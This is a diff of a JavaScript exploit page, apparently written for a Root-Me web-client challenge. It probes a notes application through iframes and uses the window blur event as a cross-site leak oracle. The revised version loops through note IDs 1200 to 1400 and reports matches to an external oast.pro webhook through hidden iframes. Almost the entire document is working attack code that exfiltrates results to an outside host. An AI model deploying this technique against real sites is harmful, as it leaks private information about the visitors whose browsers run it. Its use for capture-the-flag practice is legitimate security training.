@@ -1,18 +1,31 @@
 <script>
-const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/1353";
-const WEBHOOK = "https://85531c6a18bfcfaeb4aegux4iseyyyyyb.oast.pro";
+const BASE_URL = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
+const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 
 window.onload = function () {
-    let blurFired = false;
-    window.addEventListener("blur", () => { blurFired = true; });
-    const iframe = document.createElement("iframe");
-    iframe.src = TARGET + "#search_note";
-    document.body.appendChild(iframe);
-    setTimeout(() => {
-        const result = blurFired ? "pro" : "no_pro";
-        const ex = document.createElement("iframe");
-        ex.src = WEBHOOK + "?result=" + result;
-        document.body.appendChild(ex);
-    }, 1000);
+    let i = 1200;
+    function testNext() {
+        if (i > 1400) return;
+        let blurFired = false;
+        const listener = () => { blurFired = true; };
+        window.addEventListener("blur", listener);
+        const iframe = document.createElement("iframe");
+        iframe.src = BASE_URL + i + "#search_note";
+        iframe.onload = function () {
+            setTimeout(() => {
+                if (blurFired) {
+                    const ex = document.createElement("iframe");
+                    ex.src = WEBHOOK + "?result=pro_" + i;
+                    ex.style.display = "none";
+                    document.body.appendChild(ex);
+                }
+                window.removeEventListener("blur", listener);
+                i++;
+                testNext();
+            }, 500);
+        };
+        document.body.appendChild(iframe);
+    }
+    testNext();
 };
 </script>
